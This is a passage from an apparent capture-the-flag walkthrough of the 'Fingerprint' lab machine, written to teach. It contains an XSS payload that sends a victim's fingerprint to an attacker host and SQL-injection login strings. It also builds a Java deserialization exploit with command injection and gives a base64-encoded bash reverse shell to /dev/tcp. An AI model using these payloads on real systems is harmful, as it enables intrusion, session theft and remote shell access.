What I really need is the admin’s browser fingerprint. I’ll write an XSS payload to capture that. I’ll have the page include the `login.js` JavaScript that calculates the fingerprints. Knowing I have access to that, I’ll update `xss.js` to:

```

var req = new XMLHttpRequest();
req.open("GET", "http://10.10.14.6/?" + getFingerPrintID(), false)
req.send();

```

I’ll log in with two blocks: `<script src="http://10.10.11.127:8080/resources/js/login.js"></script><script src="http://10.10.14.6/xss.js"></script>`.

```

<script src="http://10.129.9:8080/resources/js/login.js"></script><script src="http://10.10.14.6/xss.js"></script>

```

One the next check, I get what looks like a fingerprint:

```
10.10.11.127 - - [05/Dec/2021 09:02:55] "GET /xss.js HTTP/1.1" 200 -
10.10.11.127 - - [05/Dec/2021 09:02:55] "GET /?962f4a03aa7ebc0515734cf398b0ccd6 HTTP/1.1" 200 -

```

I can confirm my guess above about the fingerprints being hashed before they are stored in the DB:

```

oxdf@hacky$ echo -n "962f4a03aa7ebc0515734cf398b0ccd6" | sha256sum 
7ef52c251f8044cb187013992891d0e58ce9194de7f535b1b4fa6bbfe08678f6  -

```

### Login

#### Get Cookie

Earlier I was able to bypass the username and potentially the password part of the auth, but failed when it checked the fingerprint. I’ll add this correct fingerprint to the query and see what comes back. When I use the username admin, I still get invalid fingerprint:

```

uid=' or username='admin' and ''='&auth_primary=password&auth_secondary=962f4a03aa7ebc0515734cf398b0ccd6

```

However, when I change to micheal1235, it works:

```

HTTP/1.1 302 Found
Server: GlassFish Server Open Source Edition  5.0.1 
X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  5.0.1  Java/Private Build/1.8)
Set-Cookie: user=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoick8wQUJYTnlBQ0ZqYjIwdVlXUnRhVzR1YzJWamRYSnBkSGt1YzNKakxtMXZaR1ZzTGxWelpYS1VCTmR6NDErNWF3SUFCRWtBQW1sa1RBQUxabWx1WjJWeWNISnBiblIwQUJKTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TUFBaHdZWE56ZDI5eVpIRUFmZ0FCVEFBSWRYTmxjbTVoYldWeEFINEFBWGh3QUFBQUFuUUFRRGRsWmpVeVl6STFNV1k0TURRMFkySXhPRGN3TVRNNU9USTRPVEZrTUdVMU9HTmxPVEU1TkdSbE4yWTFNelZpTVdJMFptRTJZbUptWlRBNE5qYzRaalowQUJSTVYyYzNaMVZTTVVWdFdEZFZUbmh6U25oeFduUUFDMjFwWTJobFlXd3hNak0xIn0.6dfequ2JzMYm2A6wgo6SU_pJWzWgqmGaChbRiXiEgTw
Location: http://10.10.11.127:8080/welcome
Content-Language: en-US
Content-Type: text/html;charset=ISO-8859-1
Connection: close
Content-Length: 182

<html>
<head><title>Document moved</title></head>
<body><h1>Document moved</h1>
This document has moved <a href="http://10.10.11.127:8080/welcome">here</a>.<p>
</body>
</html>

```

It’s setting a cookie and redirecting me to `/welcome`.

#### JWT

The Cookie itself is a JWT:

[![image-20211103092627547](https://0xdfimages.gitlab.io/img/image-20211103092627547.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211103092627547.png)

What’s especially interesting is that the secret used by Flask (`SjG$g5VZ(vHC;M2Xc/2~z(`)also works here to sign this JWT:

[![image-20211103100452079](https://0xdfimages.gitlab.io/img/image-20211103100452079.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211103100452079.png)

This means that I can edit this cookie and resign it in a way that will be trusted by the application.

#### Java Serialized User Object

The `user` data is a big blob of base64. Decoding it shows it starts with 0xaced, which are the magic bytes for [serialized Java data](https://docs.oracle.com/javase/7/docs/platform/serialization/spec/protocol.html):

```

oxdf@hacky$ echo "rO0ABXNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgABTAAIdXNlcm5hbWVxAH4AAXhwAAAAAnQAQDdlZjUyYzI1MWY4MDQ0Y2IxODcwMTM5OTI4OTFkMGU1OGNlOTE5NGRlN2Y1MzViMWI0ZmE2YmJmZTA4Njc4ZjZ0ABRMV2c3Z1VSMUVtWDdVTnhzSnhxWnQAC21pY2hlYWwxMjM1" | base64 -d | xxd
00000000: aced 0005 7372 0021 636f 6d2e 6164 6d69  ....sr.!com.admi
00000010: 6e2e 7365 6375 7269 7479 2e73 7263 2e6d  n.security.src.m
00000020: 6f64 656c 2e55 7365 7294 04d7 73e3 5fb9  odel.User...s._.
00000030: 6b02 0004 4900 0269 644c 000b 6669 6e67  k...I..idL..fing
00000040: 6572 7072 696e 7474 0012 4c6a 6176 612f  erprintt..Ljava/
00000050: 6c61 6e67 2f53 7472 696e 673b 4c00 0870  lang/String;L..p
00000060: 6173 7377 6f72 6471 007e 0001 4c00 0875  asswordq.~..L..u
00000070: 7365 726e 616d 6571 007e 0001 7870 0000  sernameq.~..xp..
00000080: 0002 7400 4037 6566 3532 6332 3531 6638  ..t.@7ef52c251f8
00000090: 3034 3463 6231 3837 3031 3339 3932 3839  044cb18701399289
000000a0: 3164 3065 3538 6365 3931 3934 6465 3766  1d0e58ce9194de7f
000000b0: 3533 3562 3162 3466 6136 6262 6665 3038  535b1b4fa6bbfe08
000000c0: 3637 3866 3674 0014 4c57 6737 6755 5231  678f6t..LWg7gUR1
000000d0: 456d 5837 554e 7873 4a78 715a 7400 0b6d  EmX7UNxsJxqZt..m
000000e0: 6963 6865 616c 3132 3335                 icheal1235

```

The strings “micheal1235” and the fingerprint are in the data. There’s a password that looks the same as the output I got, except it has upper and lower case. My first instinct was that is a serialized `User` object from `User.java` above, especially given the string `com.admin.security.src.model.User` at the top. However, that is actually a reference to the fact that this serialized object contains a `User` object. `UserProfileStorage` makes sense.

#### /welcome

If I set that cookie in my browser and visit `http://10.10.11.127:8080/welcome`, I get a new page:

![image-20211103092506503](https://0xdfimages.gitlab.io/img/image-20211103092506503.png)

If I give it an actual JPG, nothing happens on the site. But Burp shows a POST to `/upload`:

```

POST /upload HTTP/1.1
Host: 10.10.11.127:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:93.0) Gecko/20100101 Firefox/93.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------4846348006145620653253433735
Content-Length: 102353
Origin: http://10.10.11.127:8080
Connection: close
Referer: http://10.10.11.127:8080/welcome
Cookie: user=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoick8wQUJYTnlBQ0ZqYjIwdVlXUnRhVzR1YzJWamRYSnBkSGt1YzNKakxtMXZaR1ZzTGxWelpYS1VCTmR6NDErNWF3SUFCRWtBQW1sa1RBQUxabWx1WjJWeWNISnBiblIwQUJKTWFtRjJZUzlzWVc1bkwxTjBjbWx1Wnp0TUFBaHdZWE56ZDI5eVpIRUFmZ0FCVEFBSWRYTmxjbTVoYldWeEFINEFBWGh3QUFBQUFuUUFRRGRsWmpVeVl6STFNV1k0TURRMFkySXhPRGN3TVRNNU9USTRPVEZrTUdVMU9HTmxPVEU1TkdSbE4yWTFNelZpTVdJMFptRTJZbUptWlRBNE5qYzRaalowQUJSTVYyYzNaMVZTTVVWdFdEZFZUbmh6U25oeFduUUFDMjFwWTJobFlXd3hNak0xIn0.6dfequ2JzMYm2A6wgo6SU_pJWzWgqmGaChbRiXiEgTw; JSESSIONID=5be24804e69f2f8e24926192d35b
Pragma: no-cache
Cache-Control: no-cache
-----------------------------4846348006145620653253433735
Content-Disposition: form-data; name="avatar"; filename="file_example_JPG_100kB.jpg"
Content-Type: image/jpeg

...[snip]...

```

The response is simple, and gives the path the file is saved to:

```

HTTP/1.1 200 OK
Server: GlassFish Server Open Source Edition  5.0.1 
X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition  5.0.1  Java/Private Build/1.8)
Content-Type: text/html;charset=ISO-8859-1
Connection: close
Content-Length: 66

Successfully uploaded to /data/uploads/file_example_JPG_100kB.jpg

```

And while it says it’s limited to image extensions only, I had no issue uploading other extensions.

### Exploit Strategy

My first thought on seeing Java deserialization was to use [ysoserial](https://github.com/frohoff/ysoserial). I tried a handful of different gadget payloads, but none provided RCE.

It was clear from the obvious command injection in the `.java` files that the intended path is to write a custom serialized Java object (actually two).

I have the ability to upload files to Fingerprint, and full control over the cookie. The cookie has a `UserProfileStorage` object, which has a `User` object with `id`, `username`, `password`, and `fingerprint`. The `username` is used to generate the location of the profile location. When the profile is loaded, there’s a command that’s executed that’s command injectable.

I assume that when the cookie is decoded by the server, it uses the `UserProfileStorage` object to call `readObject` which calls `readProfile` which has the injectable code path:

```

    public Profile readProfile() throws IllegalStateException {

        final File profileFile = user.getProfileLocation();

        try {
            final Path path = Paths.get(profileFile.getAbsolutePath());
            final byte[] content = Files.readAllBytes(path);

            final Profile profile = (Profile) SerUtils.from(content);
            if (profile.isAdminProfile()) { // load authentication logs only for super user
                profile.getLogs().clear();
                final String cmd = "cat " + AUTH_LOG.getAbsolutePath() + " | grep " + user.getUsername();
                profile.getLogs().addAll(Arrays.asList(Terminal.run(cmd).split("\n")));
            }
            return profile;
        } catch (final Exception e) {
            throw new IllegalStateException("Error fetching profile");
        }

    }

```

To reach that point, I need have `profile.isAdminProfile()` return true. `profile` is read from the `user.getProfileLocation()` function and deserialized. The path to the profile is:

```

"/data/sessions/" + username + ".ser";

```

I can generate a profile with `admin` set to true, upload it using the image upload, and use the `username` field in the cookie to do a path traversal attack to have it load that profile.

The command that gets run is:

```

"cat " + AUTH_LOG.getAbsolutePath() + " | grep " + user.getUsername();

```

Both are based on the username. If I can create a username that gets the path to the profile to be `/data/uploads/0xdf.ser`, and a username that gives command execution in that injection, I’ll have execution.

The challenge is to come up with a `username` that both gets to the uploaded `.ser` file *and* has command injection in it.

To get to the profile, I’ll need something that looks like:

```

../uploads/0xdf.ser

```

There’s a lot of ways that I can do command injection. I’ll try a subshell (`$()`).

I can take a guess that perhaps it will handle my path correctly if I give it:

```

../../../../$(command)/../../../../data/uploads/0xdf.ser

```

If this worked, it would read my uploaded profile, see it’s an admin, and then execute the broken logs command, which would include the command in the subshell.

### Create Maven Project

#### Install Maven

This code has a lot of dependencies. I’ll use Maven to organize this. [Maven](https://maven.apache.org/index.html) is a tool for managing a Java project. I initially installed Maven with `apt install maven`. In my VM, trying to start a project led to errors. That’s because it installed Maven 3.6.3, which doesn’t work with Java17, and leads to errors like:

```

[ERROR] Error executing Maven.
[ERROR] java.lang.IllegalStateException: Unable to load cache item
[ERROR] Caused by: Unable to load cache item
[ERROR] Caused by: Could not initialize class com.google.inject.internal.cglib.core.$MethodWrapper

```

I downloaded version 3.8.3 using the instructions [here](https://maven.apache.org/install.html) and it worked. I think I could have used an older Java version as well.

#### Create Project Structure

[This post](https://maven.apache.org/guides/getting-started/maven-in-five-minutes.html) gives a good idea for getting started with Maven. I’ll create a folder `exploit` and then in it I’ll create the folder structure for the various Java files I have and plan to use. Most of that can be done with the `mvn archetype:generate` command.

If I just run the command exactly from the tutorial, it will generate a structure like this:

```

oxdf@hacky$ mvn archetype:generate -DgroupId=com.mycompany.app -DartifactId=my-app -DarchetypeArtifactId=maven-archetype-quickstart -DarchetypeVersion=1.4 -DinteractiveMode=false
...[snip]...
oxdf@hacky$ tree my-app/
my-app/
├── pom.xml
└── src
    ├── main
    │   └── java
    │       └── com
    │           └── mycompany
    │               └── app
    │                   └── App.java
    └── test
        └── java
            └── com
                └── mycompany
                    └── app
                        └── AppTest.java

11 directories, 3 files

```

I’ll change the command slightly to get something that looks more like the packages from the source I already have:

```

oxdf@hacky$ mvn archetype:generate -DgroupId=com.admin.security.src -DartifactId=exploit -DarchetypeArtifactId=maven-archetype-quickstart -DarchetypeVersion=1.4 -DinteractiveMode=false
...[snip]...
oxdf@hacky$ tree exploit/
exploit/
├── pom.xml
└── src
    ├── main
    │   └── java
    │       └── com
    │           └── admin
    │               └── security
    │                   └── src
    │                       └── App.java
    └── test
        └── java
            └── com
                └── admin
                    └── security
                        └── src
                            └── AppTest.java

13 directories, 3 files

```

Now I’ll add the Java files I already have:

```

oxdf@hacky$ mkdir exploit/src/main/java/com/admin/security/src/model
oxdf@hacky$ cp User.java exploit/src/main/java/com/admin/security/src/model/
oxdf@hacky$ cp Profile.java exploit/src/main/java/com/admin/security/src/model/
oxdf@hacky$ mkdir exploit/src/main/java/com/admin/security/src/profile
oxdf@hacky$ cp UserProfileStorage.java exploit/src/main/java/com/admin/security/src/profile/

```

#### Fix External Dependencies

The next step is to run `mvn package`, and it will fail with a lot of errors. Many of the errors were for packages not existing. I’ll use `grep` to isolate those errors and `sort -u` to get them uniquely. There are three:

```

oxdf@hacky$ mvn package | grep -Eo 'package .* does not exist' | sort -u
package com.admin.security.src.utils does not exist
package javax.persistence does not exist
package lombok does not exist

```

`com.admin.security.src.utils` is custom for this application. I’ll deal with that later.

[Project Lombok](https://projectlombok.org/) is a Java library for making simpler Java classes. It’s responsible for a lot of the `@...` decorators in the code from Fingerprint. [This page](https://projectlombok.org/setup/maven) shows had to add it to my `pom.xml` file. The automatically generated on includes `junit` (presumably java unit testing), so I’ll just add it in there:

```

...[snip]...
  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.11</version>
      <scope>test</scope>
    </dependency>
    <dependency>
      <groupId>org.projectlombok</groupId>
      <artifactId>lombok</artifactId>
      <version>1.18.22</version>
      <scope>provided</scope>
    </dependency>
  </dependencies>
...[snip]...

```

`javax.persistence` is an API for managing object mapping into persistent storage, like a database. It’s imported by `User.java`:

```

oxdf@hacky$ grep -r javax.persistence .
./src/main/java/com/admin/security/src/model/User.java:import javax.persistence.*;

```

[The docs](https://docs.oracle.com/javaee/7/api/javax/persistence/package-summary.html) show all the classes, and I can see it’s a handful of decorators used in `User.java` (I’ve labeled them with a comment):

```

@AllArgsConstructor
@NoArgsConstructor
@Entity
@Data
@Table(name = "users")    // <-- persistence
public class User implements Serializable {
    private static final long serialVersionUID = -7780857363453462165L;

    @Id  // <-- persistence
    @GeneratedValue(strategy = GenerationType.IDENTITY)  // <-- persistence
    @Column(name = "id")  // <-- persistence
    protected int id;

    @Column(name = "username")  // <-- persistence
    protected String username;

    @Column(name = "password")  // <-- persistence
    protected String password;

    @Column(name = "fingerprint")  // <-- persistence
    protected String fingerprint;

    public File getProfileLocation() {
        final File dir = new File("/data/sessions/");
        dir.mkdirs();

        final String pathname = dir.getAbsolutePath() + "/" + username + ".ser";
        return Paths.get(pathname).normalize().toFile();
    }

    public boolean isAdmin() {
        return username.equals("admin");
    }

    public void updateProfile(final Profile profile) throws IOException {
        final byte[] res = SerUtils.toByteArray(profile);
        FileUtil.write(res, getProfileLocation());
    }
}

```

Because I’m not interacting with a DB at all, I’ll just remove these lines and the import.

#### Utils

There are three classes in a `utils` package that are imported in both `UserProfileStorage.java` and `User.java`:

```

oxdf@hacky$ grep -r com.admin.security.src.utils .
./src/main/java/com/admin/security/src/profile/UserProfileStorage.java:import com.admin.security.src.utils.SerUtils;
./src/main/java/com/admin/security/src/profile/UserProfileStorage.java:import com.admin.security.src.utils.Terminal;
./src/main/java/com/admin/security/src/model/User.java:import com.admin.security.src.utils.FileUtil;
./src/main/java/com/admin/security/src/model/User.java:import com.admin.security.src.utils.SerUtils;

```

There are two functions called from `SerUtils`, `from()` and `toByteArray()`. From `FileUtil`, there’s only `write()`. And from `Terminal`, `run()`.

Starting with `Terminal.run()`, it’s used in `UserProfile.java`:

```

            if (profile.isAdminProfile()) { // load authentication logs only for super user
                profile.getLogs().clear();
                final String cmd = "cat " + AUTH_LOG.getAbsolutePath() + " | grep " + user.getUsername();
                profile.getLogs().addAll(Arrays.asList(Terminal.run(cmd).split("\n")));
            }

```

Because I’m just creating serialized objects here, I don’t care about actually running that in my code (the methods are not passed along in the object), so I can just comment out the entire `if` block above.

The other three functions are used. `FileUtil.write()` is used in `User.java`, and seems to take a byte array and a path:

```

    public void updateProfile(final Profile profile) throws IOException {
        final byte[] res = SerUtils.toByteArray(profile);
        FileUtil.write(res, getProfileLocation());
    }

```

[This post](https://www.baeldung.com/java-write-byte-array-file) shows many ways to do that. The Java NIO one looks clean and without external dependencies. My `FileUtil.java` turned out to be:

```

package com.admin.security.src.utils;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class FileUtil {
        public static void write(final byte[] data, final File file) throws IOException {
                if (!file.isFile()) {
                        file.createNewFile();
                }
                Files.write(Paths.get(file.getAbsolutePath()), data);
        }
}

```

I’ll need to create the `SerUtils.java` file as well. `toByteArray` above takes a Java object and returns a byte array, which I can assume is the serialized object. [This page](https://www.tutorialspoint.com/How-to-convert-an-object-to-byte-array-in-java) has some nice code to do just that. [This stack overflow](https://stackoverflow.com/questions/3736058/java-object-to-byte-and-byte-to-object-converter-for-tokyo-cabinet/3736091) has the functions for both directions.

```

package com.admin.security.src.utils;

import java.io.Serializable;
import java.io.IOException;
import java.io.ByteArrayOutputStream;
import java.io.ByteArrayInputStream;
import java.io.ObjectOutputStream;
import java.io.ObjectInputStream;
import java.lang.ClassNotFoundException;

public class SerUtils {
        public static byte[] toByteArray(final Serializable obj) throws IOException {
                ByteArrayOutputStream bos = new ByteArrayOutputStream();
                ObjectOutputStream oos = new ObjectOutputStream(bos);
                oos.writeObject(obj);
                oos.flush();
                return bos.toByteArray();
        }

        public static Object from(byte[] data) throws IOException, ClassNotFoundException {
                ByteArrayInputStream bis = new ByteArrayInputStream(data);
                ObjectInputStream ois = new ObjectInputStream(bis);
                return ois.readObject();
        }
}

```

#### Fix Other Issues

I’ll compile this will `mvn package`. It throws a bunch of errors. Some are typos. Others require changes. For example, I don’t have a `AUTH_LOG` variable in `Profile.java`. I’ll just comment out the import, and comment out where it’s used (not needed).

I had to add a plugin to my `pom.xml` file like this:

```

    </pluginManagement>
      <plugins>
          <plugin>
              <groupId>org.apache.maven.plugins</groupId>
              <artifactId>maven-compiler-plugin</artifactId>
              <configuration>
                  <source>8</source>
                  <target>8</target>
              </configuration>
          </plugin>
      </plugins>
  </build>
</project>

```

#### Build

When I build successfully, following the commands in the [Maven tutorial](https://maven.apache.org/guides/getting-started/maven-in-five-minutes.html), I can run it with:

```

oxdf@hacky$ java -cp target/exploit-1.0-SNAPSHOT.jar com.admin.security.src.App
Hello World!

```

If I don’t want to type in the full path to the class to run each time, I can use the `maven-jar-plugin` to [create and pack](https://stackoverflow.com/questions/29920434/maven-adding-mainclass-in-pom-xml-with-the-right-folder-path) the `MANIFEST.MF` file by adding it to the `pom.xml`:

```

          <plugin>
              <groupId>org.apache.maven.plugins</groupId>
              <artifactId>maven-jar-plugin</artifactId>
              <configuration>
                 <archive>
                   <manifest>
                     <addClasspath>true</addClasspath>
                     <mainClass>com.admin.security.src.App</mainClass>
                   </manifest>
                 </archive>
              </configuration>
          </plugin>

```

I’ll need to set the `mainClass` attribute. Now on building:

```

oxdf@hacky$ java -jar target/exploit-1.0-SNAPSHOT.jar 
Hello World!

```

### Create Malicious Objects

#### Strategy

Now I want to create a main function to do malicious things. The project builder left this in place:

```

package com.admin.security.src;

/**
 * Hello world!
 *
 */
public class App
{
    public static void main( String[] args )
    {
        System.out.println( "Hello World!" );
    }
}

```

I’ll change it to have it generate two things:
- A simple serialized `Profile` object that has `admin` set to true.
- A serialized `UserProfile` object for the cookie that has the path that both gets to the uploaded profile and has command injection.

#### Profile Object

To create a `Profile` object, I’ll just create one like in the code I have, and then I’ll write it to a file using the `SerUtils` and `FileUtil`:

```

package com.admin.security.src;

import com.admin.security.src.model.Profile;
import com.admin.security.src.utils.SerUtils;
import com.admin.security.src.utils.FileUtil;
import java.util.ArrayList;
import java.io.File;
import java.io.IOException;

public class App {
    public static void main( String[] args ) throws IOException {
        Profile profile = new Profile(new ArrayList<>(), true);
        FileUtil.write(SerUtils.toByteArray(profile), new File("./0xdf.ser"));
    }
}

```

When I `mvn package` and then run this, it generates the file:

```

oxdf@hacky$ xxd 0xdf.ser 
00000000: aced 0005 7372 0024 636f 6d2e 6164 6d69  ....sr.$com.admi
00000010: 6e2e 7365 6375 7269 7479 2e73 7263 2e6d  n.security.src.m
00000020: 6f64 656c 2e50 726f 6669 6c65 3774 2025  odel.Profile7t %
00000030: 7b91 5797 0200 035a 000c 6164 6d69 6e50  {.W....Z..adminP
00000040: 726f 6669 6c65 4c00 0661 7661 7461 7274  rofileL..avatart
00000050: 000e 4c6a 6176 612f 696f 2f46 696c 653b  ..Ljava/io/File;
00000060: 4c00 046c 6f67 7374 0010 4c6a 6176 612f  L..logst..Ljava/
00000070: 7574 696c 2f4c 6973 743b 7870 0170 7372  util/List;xp.psr
00000080: 0013 6a61 7661 2e75 7469 6c2e 4172 7261  ..java.util.Arra
00000090: 794c 6973 7478 81d2 1d99 c761 9d03 0001  yListx.....a....
000000a0: 4900 0473 697a 6578 7000 0000 0077 0400  I..sizexp....w..
000000b0: 0000 0078

```

#### UserProfileStorage Object

To create a `UserProfileStorage`, I first need a `User`. The `@AllArgsConstructor` means that there is a constructor which sets all the args in the order they show up (from `User.java`):

```

@AllArgsConstructor
@NoArgsConstructor
@Data
public class User implements Serializable {
    private static final long serialVersionUID = -7780857363453462165L;

    protected int id;

    protected String username;

    protected String password;

    protected String fingerprint;

```

I’ll create a user, not worrying about the `password` or `fingerprint`, and then base64 encode it and print it:

```

package com.admin.security.src;

import com.admin.security.src.model.User;
import com.admin.security.src.model.Profile;
import com.admin.security.src.profile.UserProfileStorage;
import com.admin.security.src.utils.SerUtils;
import com.admin.security.src.utils.FileUtil;
import java.util.ArrayList;
import java.util.Base64;
import java.io.File;
import java.io.IOException;

public class App {
    public static void main( String[] args ) throws IOException {
        Profile profile = new Profile(new ArrayList<>(), true);
        FileUtil.write(SerUtils.toByteArray(profile), new File("./0xdf.ser"));

        User user = new User(223, "../../../../$(ping -c 1 10.10.14.6)/../../../data/uploads/0xdf", "", "");
        UserProfileStorage ups = new UserProfileStorage(user);
        System.out.println(Base64.getEncoder().encodeToString(SerUtils.toByteArray(ups)));
    }
}

```

I’ll package it, and then run:

```

oxdf@hacky$ java -jar target/exploit-1.0-SNAPSHOT.jar 
rO0ABXNyADFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLnByb2ZpbGUuVXNlclByb2ZpbGVTdG9yYWdlsVf4McAfoVsCAAFMAAR1c2VydAAjTGNvbS9hZG1pbi9zZWN1cml0eS9zcmMvbW9kZWwvVXNlcjt4cHNyACFjb20uYWRtaW4uc2VjdXJpdHkuc3JjLm1vZGVsLlVzZXKUBNdz41+5awIABEkAAmlkTAALZmluZ2VycHJpbnR0ABJMamF2YS9sYW5nL1N0cmluZztMAAhwYXNzd29yZHEAfgAETAAIdXNlcm5hbWVxAH4ABHhwAAAA33QAAHEAfgAGdAA+Li4vLi4vLi4vLi4vJChwaW5nIC1jIDEgMTAuMTAuMTQuNikvLi4vLi4vLi4vZGF0YS91cGxvYWRzLzB4ZGY=

```

### Execution

#### RCE POC

I’ll upload `0xdf.ser` on the avatar page. It returns in the background:

```

Successfully uploaded to /data/uploads/0xdf.ser

```

Then I’ll take the base64 generated above and put it into JWT.io (with the signing secret still there), updating the `user` field. That generates a new cookie:

[![image-20211104133623138](https://0xdfimages.gitlab.io/img/image-20211104133623138.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211104133623138.png)

On adding that cookie to Firefox, when I refresh the page:

```

oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
13:26:38.374336 IP 10.10.10.141 > 10.10.14.6: ICMP echo request, id 50182, seq 1, length 64
13:26:38.374362 IP 10.10.14.6 > 10.10.10.141: ICMP echo reply, id 50182, seq 1, length 64

```

#### Shell

I’ll encode a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) in base64 to get rid of special characters:

```

oxdf@hacky$ echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==

```

I’ll update the payload in my Java, and rebuild it. When I run it, I get a new base64 encoded `UserProfileStorage` object. I’ll paste that into JWT.io to update the cookie, and get a new one, which I can add to Firefox. On refreshing, I get a shell:

```

oxdf@hacky$ nc -lnvp 443                                          
Listening on 0.0.0.0 443
Connection received on 10.10.10.141 54908
bash: cannot set terminal process group (1161): Inappropriate ioctl for device
bash: no job control in this shell
www-data@fingerprint:/opt/glassfish5/glassfish/domains/domain1/config$

```

I’ll use the standard `script` trick to upgrade the shell:

```

www-data@fingerprint:/opt/glassfish5/glassfish/domains/domain1/config$ script /dev/null -c bash
Script started, file is /dev/null
www-data@fingerprint:/opt/glassfish5/glassfish/domains/domain1/config$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@fingerprint:/opt/glassfish5/glassfish/domains/domain1/config$ 

```

## Shell as john

### Enumeration

#### Homedirs

As I noted in the file read vuln above, there are two users with homedirs on the box:

```

www-data@fingerprint:/home$ ls
flask  john

```

I can’t access john (which means it’s likely where I’m to head next).

`flask` has the webapp from port 80. There’s nothing too exciting here given I was already able to pull and look at the source.

#### Webapps

It’s always worthwhile to look for creds in the webapps. The flask app doesn’t have much beyond the signing secret. Because it’s using a file (SQLite), it doesn’t need a password to connect.

The Java apps are a bit more complicated. I know there’s a `User.java` file, so I’ll find that first:

```

www-data@fingerprint:/$ find . -name User.java 2>/dev/null
./opt/glassfish5/glassfish/domains/domain1/applications/app/backup_files/User.java

```

In that same area of the file system, there’s an `app.war` file. WAR files is how Java applications are typically deployed. I’ll send it back to my host with `nc` (and check the hashes after transfer to make sure they match).

I’ll open it in [jd-gui](http://java-decompiler.github.io/), and it’s the application:

![image-20211104171805907](https://0xdfimages.gitlab.io/img/image-20211104171805907.png)

I first looked in `Settings.class`, but nothing interesting in there.

In `JWTUtil.class` I can see the same signing secret, but this isn’t new to me:

![image-20211104171941454](https://0xdfimages.gitlab.io/img/image-20211104171941454.png)

Some of the functions seem to have a hard time decompiling, and show Java byte code instead of source. For example, `LoginServlet.class` has the `doGet` function:

[![image-20211104172045940](https://0xdfimages.gitlab.io/img/image-20211104172045940.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20211104172045940.png)

When looking through the other files, `HibernateUtil.class` is interesting. [Hibernate](https://www.tutorialspoint.com/hibernate/hibernate_overview.htm) is an ORM solution for Java, which means is handles DB connections. In the `getSessionFactory()` function there’s a password:

![image-20211104172157928](https://0xdfimages.gitlab.io/img/image-20211104172157928.png)

I’ll note this for later.

#### Listening Services

`netstat` shows a bunch of listening ports:

```

www-data@fingerprint:/$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:40593         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:56531         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8088            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:34745         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:44445         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:58401         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:51399         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::8686                 :::*                    LISTEN      1521/java           
tcp6       0      0 :::4848                 :::*                    LISTEN      1521/java           
tcp6       0      0 :::8080                 :::*                    LISTEN      1521/java           
tcp6       0      0 ::1:56531               :::*                    LISTEN      -                   
tcp6       0      0 :::3700                 :::*                    LISTEN      1521/java           
tcp6       0      0 :::8181                 :::*                    LISTEN      1521/java           
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::7676                 :::*                    LISTEN      1521/java           
tcp6       0      0 ::1:58401               :::*                    LISTEN      -                   
tcp6       0      0 ::1:51399               :::*                    LISTEN      -

```

Many of them are GlassFish related, and some others I couldn’t figure out. But 8088 is interesting. It looks to be similar to the service running on 80:

```

www-data@fingerprint:/$ curl localhost:8088
<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>mylog- Starting page</title>
    <link href="https://fonts.googleapis.com/css?family=IBM+Plex+Sans:400,600" rel="stylesheet">         
    <link rel="stylesheet" href="static/dist/css/style.css">
        <script src="https://unpkg.com/animejs@3.0.1/lib/anime.min.js"></script>
    <script src="https://unpkg.com/scrollreveal@4.0.0/dist/scrollreveal.min.js"></script>                
</head>
<body class="is-boxed has-animations">
...[snip]...

```

Interestingly, the broken 302 on `/admin` seems to have been fixed as it no longer returns the page in the 302:

```

www-data@fingerprint:/$ curl -v localhost:8088/admin
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8088 (#0)
> GET /admin HTTP/1.1
> Host: localhost:8088
> User-Agent: curl/7.58.0
> Accept: */*
> 
